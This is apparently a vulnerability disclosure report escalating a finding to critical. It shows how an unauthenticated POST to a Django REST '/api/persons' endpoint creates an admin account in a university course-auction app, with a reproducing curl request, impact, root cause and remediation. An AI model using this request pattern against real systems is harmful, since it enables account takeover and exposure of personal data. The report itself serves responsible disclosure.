## Update: Escalation to Critical — Unauthenticated Admin Account Creation + Full Admin Access

### Summary

The `/api/persons` endpoint accepts `POST` requests without any authentication. By sending a single unauthenticated request, an attacker can create an account with `type: admin` and a password of their choice, then log in with full admin privileges to the application.

This escalates the original finding from information disclosure to **full unauthenticated admin access**.

---

### Steps to Reproduce

#### Step 1 — Confirm POST is accepted without auth

```
OPTIONS /api/persons HTTP/1.1
Host: [TARGET]

HTTP 200 OK
Allow: GET, POST, HEAD, OPTIONS
```

The `Allow` header confirms the endpoint accepts `POST`.

#### Step 2 — Create admin account without authentication

```bash
curl -sk -X POST https://[TARGET]/api/persons \
  -H "Content-Type: application/json" \
  -d '{"email":"[EMAIL]","first_name":"VDP","last_name":"Test","type":"admin","password":"[PASSWORD]"}'
```

**Response (201 Created):**

```json
{
    "id": [ID],
    "email": "[EMAIL]",
    "first_name": "VDP",
    "last_name": "Test",
    "type": "admin",
    "auctions": {
        "start_date": null,
        "end_date": null
    },
    "votes": [],
    "individualSettings": [],
    "created_at": "[TIMESTAMP]",
    "created_by": null,
    "modified_at": "[TIMESTAMP]",
    "modified_by": null
}
```

Note: `created_by: null` confirms no authenticated session was used.

#### Step 3 — Log in as admin

1. Navigate to `https://[TARGET]/`
2. Enter the credentials from Step 2 (`[EMAIL]` / `[PASSWORD]`)
3. Login succeeds. The application displays **"Admin — Logout (VDP)"** in the header, confirming admin-level access.

#### Step 4 — Confirm full admin privileges

After login, the admin panel provides:

- Full list of all 8 auctions (spanning several years), including hidden ones (status `[HIDDEN]`)
- Ability to edit auction settings (dates, coin limits, max votes)
- Access to all participant data (names, emails, votes)
- Export functionality for participant lists
- Ability to create, modify and delete courses/auction items

*(See attached screenshots)*

---

### Evidence of prior exploitation

The database already contains an admin account created by another unauthenticated attacker:

```json
{
    "id": [ID],
    "email": "[EMAIL]",
    "first_name": "Evil",
    "last_name": "Attacker",
    "type": "admin",
    "created_at": "[TIMESTAMP]",
    "created_by": null
}
```

This account was created about **5 months** before my test, also with `created_by: null`, indicating the vulnerability has been actively exploitable for at least 5 months.

---

### Impact

- **Full application takeover**: Any unauthenticated attacker can create an admin account and gain complete control over the application.
- **Data manipulation**: An attacker can modify auction results, change course assignments, alter student votes, and corrupt academic data.
- **PII access**: Full access to personal data (names, emails) of all 158+ university users (staff and students), protected under the applicable data protection law and GDPR.
- **Academic integrity**: Auction results determine course assignments — an attacker could manipulate outcomes to favor specific students.

### Root cause

The Django REST Framework `ViewSet` for `/api/persons` has no `permission_classes` configured, defaulting to `AllowAny` for all HTTP methods including `POST`. Authentication is inconsistently applied (e.g., `/api/votes` correctly returns 403).

### Remediation

1. Add `permission_classes = [IsAuthenticated]` to the `PersonViewSet`
2. Restrict `POST` on `/api/persons` to admin users only (`IsAdminUser`)
3. Audit and remove unauthorized accounts (`created_by: null`)
4. Review all API endpoints for consistent authentication enforcement
